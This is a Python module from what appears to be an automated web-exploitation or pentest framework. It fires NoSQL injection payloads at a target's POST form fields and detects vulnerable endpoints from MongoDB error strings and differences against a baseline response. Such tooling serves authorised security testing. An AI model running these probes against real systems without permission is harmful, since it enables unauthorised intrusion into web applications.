from __future__ import annotations
import json
from urllib.parse import urlsplit,parse_qsl,urlencode,urlunsplit
from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads
class NoSQLModule(ExploitModule):
    name="NoSQL Injection"; category="injection"
    async def run(self,ctx):
        evidence=[];probes=get_payloads(self.name)
        forms=[f for f in (ctx.artifacts.get("recon.forms",[]) or []) if f.get("method")=="POST"]
        for form in forms[:20]:
            action=form.get("action") or ctx.target.url
            fields=[i.get("name") for i in form.get("inputs",[]) if i.get("name")]
            if not fields: continue
            for i,payload in enumerate(probes,1):
                ctx.logger(f"[payload {i}/{len(probes)}] NoSQL Injection")
                data={n:payload for n in fields[:4]}
                try:
                    baseline=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps({n:"ctf-baseline" for n in fields[:4]}),use_curl=False,follow_redirects=False)
                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps(data),use_curl=False,follow_redirects=False)
                    ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                    evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
                    low=r.text.lower()
                    markers=("mongodb", "mongoerror", "$ne", "$regex", "cast to objectid")
                    if any(m in low for m in markers) or (r.status_code != baseline.status_code and abs(len(r.text)-len(baseline.text)) > 80):
                        ctx.add_finding(action, payload, self.name, f"HTTP {r.status_code}; NoSQL-specific/error or differential evidence", confidence="medium")
                        return ExploitResult(self.name, "signal", "Potential NoSQL injection evidence observed", evidence=action)
                except Exception as exc:evidence.append(str(exc))
        return ExploitResult(self.name,"no-signal","NoSQL probes completed",evidence="\n".join(evidence[:20]))
